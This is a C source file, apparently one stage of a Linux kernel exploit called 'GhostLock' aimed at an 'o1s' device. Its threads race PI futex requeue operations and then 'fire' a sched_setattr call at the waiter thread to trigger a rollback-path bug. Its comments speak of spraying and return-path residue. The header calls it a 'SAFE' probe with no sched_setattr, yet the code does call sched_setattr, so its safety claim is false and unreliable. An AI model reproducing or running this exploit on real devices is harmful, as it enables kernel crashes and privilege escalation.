/* dev_trigger: SAFE GhostLock trigger probe for o1s device (no fire!).
 * owner holds TARGET + blocks on CHAIN; waiter holds CHAIN +
 * WAIT_REQUEUE_PI(f_wait->TARGET, 8s); main gates on wchans + CMP.
 * Reports CMP ret/errno (EDEADLK=35 proves rollback path on KDP kernel)
 * + waiter/owner wchans. No sched_setattr -> no panic risk. */
#define _GNU_SOURCE
#include <errno.h>
#include <linux/futex.h>
#include <linux/sched.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/syscall.h>
#include <sys/time.h>
#include <unistd.h>
#ifndef SYS_futex
#define SYS_futex 98
#endif
#ifndef SYS_sched_setattr
#define SYS_sched_setattr 274
#endif
#define FPRV 128

static uint32_t f_wait, f_target, f_chain;
static volatile int a_tid, o_tid, a_ready, b_started, a_waiting;
static volatile int spray_done, fire_done;

static long futex_op(uint32_t *uaddr, int op, uint32_t val, void *arg4,
                     uint32_t *uaddr2, uint32_t val3)
{
    errno = 0;
    return syscall(SYS_futex, uaddr, op, val, arg4, uaddr2, val3);
}

static int read_wchan(int tid, char *buf, size_t n)
{
    char path[64];
    snprintf(path, sizeof(path), "/proc/self/task/%d/wchan", tid);
    FILE *f = fopen(path, "r");
    size_t r;
    if (!f)
        return -1;
    r = fread(buf, 1, n - 1, f);
    fclose(f);
    if (!r)
        return -1;
    buf[r] = 0;
    return 0;
}

static int is_futex_blocked(int tid)
{
    char wch[64] = {0};
    return read_wchan(tid, wch, sizeof(wch)) == 0 &&
           strcmp(wch, "futex_wait_queue_me") == 0;
}

static int is_blocked_any(int tid)
{
    char wch[64] = {0};
    if (read_wchan(tid, wch, sizeof(wch)) != 0 || wch[0] == 0)
        return 0;
    return strcmp(wch, "futex_wait_queue_me") == 0 ||
           strcmp(wch, "rt_mutex_wait_proxy_lock") == 0;
}

static void *waiter_fn(void *arg)
{
    struct timespec ts;
    (void)arg;
    a_tid = (int)syscall(SYS_gettid);
    if (futex_op(&f_chain, (FUTEX_LOCK_PI | FPRV), 0, NULL, NULL, 0) != 0) {
        printf("waiter: LOCK_PI chain errno=%d\n", errno);
        return NULL;
    }
    a_ready = 1;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    ts.tv_sec += 8;
    a_waiting = 1;
    errno = 0;
    long r = syscall(SYS_futex, &f_wait, (FUTEX_WAIT_REQUEUE_PI | FPRV),
                     0, &ts, &f_target, 0);
    printf("waiter: WAIT ret=%ld errno=%d\n", r, errno);
    spray_done = 1; /* baseline: no spray, fire on return-path residue */
    while (!fire_done)
        sched_yield();
    futex_op(&f_chain, (FUTEX_UNLOCK_PI | FPRV), 0, NULL, NULL, 0);
    return NULL;
}

static void *owner_fn(void *arg)
{
    (void)arg;
    o_tid = (int)syscall(SYS_gettid);
    if (futex_op(&f_target, (FUTEX_LOCK_PI | FPRV), 0, NULL, NULL, 0) != 0) {
        printf("owner: LOCK_PI target errno=%d\n", errno);
        return NULL;
    }
    while (!a_ready)
        sched_yield();
    b_started = 1;
    futex_op(&f_chain, (FUTEX_LOCK_PI | FPRV), 0, NULL, NULL, 0);
    return NULL;
}

static void *consumer_fn(void *arg)
{
    struct sched_attr attr;
    (void)arg;
    while (!a_tid)
        sched_yield();
    while (!spray_done)
        sched_yield();
    memset(&attr, 0, sizeof(attr));
    attr.size = sizeof(attr);
    attr.sched_policy = SCHED_BATCH;
    attr.sched_nice = 19;
    errno = 0;
    printf("consumer: FIRE sched_setattr(tid=%d)\n", a_tid);
    long sr = syscall(SYS_sched_setattr, a_tid, &attr, 0);
    printf("consumer: sched_setattr ret=%ld errno=%d\n", sr, errno);
    fire_done = 1;
    return NULL;
}

int main(void)
{
    pthread_t w, o, c;
    char ow[64] = {0}, ww[64] = {0};
    setvbuf(stdout, NULL, _IONBF, 0);
    alarm(60);
    printf("dev_fire: o1s baseline fire on return-path residue\n");
    pthread_create(&o, NULL, owner_fn, NULL);
    pthread_create(&w, NULL, waiter_fn, NULL);
    pthread_create(&c, NULL, consumer_fn, NULL);
    while (!a_waiting || !b_started)
        sched_yield();
    {
        int ok = 0;
        for (int s = 0; s < 400 && !ok; s++) {
            if (is_futex_blocked(a_tid) && is_blocked_any(o_tid))
                ok = 1;
            else
                usleep(5000);
        }
        read_wchan(o_tid, ow, sizeof(ow));
        read_wchan(a_tid, ww, sizeof(ww));
        printf("main: gate ok=%d owner(%d)=%s waiter(%d)=%s\n", ok, o_tid,
               ow, a_tid, ww);
        if (!ok)
            return 1;
    }
    usleep(50000);
    errno = 0;
    long cr = futex_op(&f_wait, (FUTEX_CMP_REQUEUE_PI | FPRV), 1, (void *)1,
                       &f_target, 0);
    printf("main: CMP ret=%ld errno=%d (35=EDEADLK rollback)\n", cr, errno);
    while (!fire_done)
        sched_yield();
    futex_op(&f_target, (FUTEX_UNLOCK_PI | FPRV), 0, NULL, NULL, 0);
    pthread_join(w, NULL);
    pthread_detach(o);
    pthread_detach(c);
    printf("dev_fire: done\n");
    return 0;
}
